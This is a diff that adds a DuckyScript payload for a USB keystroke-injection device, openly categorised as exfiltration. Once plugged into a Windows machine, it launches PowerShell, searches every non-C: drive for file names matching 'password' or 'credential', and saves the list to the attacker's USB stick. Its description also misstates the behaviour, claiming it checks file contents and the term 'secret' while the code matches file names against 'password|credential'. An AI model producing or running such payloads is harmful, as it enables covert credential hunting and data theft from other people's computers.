@@ -1,0 +1,29 @@
+REM Title:			Secret File List
+REM Description:	This will list all files that contain the words "password" or "secret", excluding those from the C: drive. You can replace these keywords with your own search terms.
+REM Author:			ih-hira
+REM Target: 		Windows
+REM Version: 		1.0
+REM Category: 		Exfiltration
+
+REM Define the drive label where you want to save the file. The default label is DUCKY. Rename your Pico drive to DUCKY for it to work properly. (optional)
+DEFINE #DRIVE_LABEL DUCKY
+
+REM Define your search term here. To search for multiple terms, separate them with a pipe (|).
+DEFINE #SEARCH_TERM password|credential
+
+ATTACKMODE HID STORAGE
+
+DELAY 500
+GUI r
+
+DELAY 300
+STRINGLN powershell
+
+DELAY 1000
+STRINGLN $m=(Get-Volume -FileSystemLabel #DRIVE_LABEL).DriveLetter; Get-PSDrive -PSProvider FileSystem | Where-Object Name -ne 'C' | ForEach-Object { Get-ChildItem ($_.Name + ':\') -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match '#SEARCH_TERM' } | Select-Object -ExpandProperty FullName }>>$m':\'$env:computername'.txt'
+STRINGLN exit
+
+REM The drive letter of the volume labeled "DUCKY" is stored in the variable $m. You can change this by defining DRIVE_LABEL.
+REM It will take time, as it scans all the drives.
+REM Keep in mind that the DUCKY drive has limited memory; if the file size exceeds the drive capacity, the file will not be saved.
+REM The results of the command will be redirected (saved) to a file on the root of the "DUCKY" drive, saved as the computer name (in .txt format).
